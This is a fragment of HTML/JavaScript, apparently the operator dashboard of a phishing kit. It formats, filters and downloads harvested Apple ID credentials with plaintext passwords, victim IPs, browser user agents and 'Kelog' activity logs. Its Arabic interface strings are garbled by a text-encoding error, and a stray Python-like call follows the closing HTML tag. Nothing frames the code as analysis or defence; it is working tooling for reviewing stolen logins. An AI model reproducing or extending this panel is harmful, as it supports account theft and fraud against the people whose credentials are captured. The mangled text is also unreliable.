            text += 'â”€'.repeat(40) + '\n';
            data.credentials.forEach((cred, index) => {
                text += `\n${index + 1}. ${cred.appleId}\n`;
                text += `   ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±: ${cred.password}\n`;
                text += `   IP: ${cred.ip || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}\n`;
                text += `   Ø§Ù„ÙˆÙ‚Øª: ${new Date(cred.time).toLocaleString('ar-SA')}\n`;
            });
            
            text += '\nğŸ‘€ Ø§Ù„Ø²ÙŠØ§Ø±Ø§Øª:\n';
            text += 'â”€'.repeat(40) + '\n';
            data.visits.forEach((visit, index) => {
                text += `\n${index + 1}. ${visit.ip || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}\n`;
                text += `   Ø§Ù„ÙˆÙ‚Øª: ${new Date(visit.time).toLocaleString('ar-SA')}\n`;
                text += `   Ø§Ù„Ù…ØªØµÙØ­: ${visit.userAgent?.substring(0, 50) || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}\n`;
            });
            
            text += '\nğŸ“Š Ø³Ø¬Ù„Ø§Øª Kelog:\n';
            text += 'â”€'.repeat(40) + '\n';
            data.kelog.forEach((log, index) => {
                text += `\n${index + 1}. ${log.action}\n`;
                text += `   Ø§Ù„ÙˆÙ‚Øª: ${new Date(log.timestamp).toLocaleString('ar-SA')}\n`;
            });
            
            text += '\n' + '='.repeat(70) + '\n';
            text += `Ù…ÙØµØ¯Ø± ÙÙŠ: ${new Date(data.exportedAt).toLocaleString('ar-SA')}\n`;
            text += '='.repeat(70);
            
            return text;
        }
        
        // ØªÙ†Ø²ÙŠÙ„ Ø§Ù„Ù…Ù„Ù
        function downloadFile(content, filename, mimeType) {
            const blob = new Blob([content], { type: mimeType });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = filename;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
        }
        
        // ÙÙ„ØªØ±Ø© Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¯Ø®ÙˆÙ„
        function filterCredentials() {
            const searchTerm = document.querySelector('.search-box').value.toLowerCase();
            const rows = document.querySelectorAll('#credentialsBody tr');
            
            rows.forEach(row => {
                const text = row.textContent.toLowerCase();
                row.style.display = text.includes(searchTerm) ? '' : 'none';
            });
        }
        
        // ØªØ­Ø¯ÙŠØ« ØªÙ„Ù‚Ø§Ø¦ÙŠ Ù„Ù„Ø¨ÙŠØ§Ù†Ø§Øª
        document.getElementById('autoRefresh')?.addEventListener('change', function(e) {
            if (e.target.checked) {
                alert('ØªÙ… ØªÙØ¹ÙŠÙ„ Ø§Ù„ØªØ­Ø¯ÙŠØ« Ø§Ù„ØªÙ„Ù‚Ø§Ø¦ÙŠ ÙƒÙ„ 10 Ø«ÙˆØ§Ù†ÙŠ');
            } else {
                alert('ØªÙ… Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„ØªØ­Ø¯ÙŠØ« Ø§Ù„ØªÙ„Ù‚Ø§Ø¦ÙŠ');
            }
        });
    </script>
</body>
</html>
    quick_start()
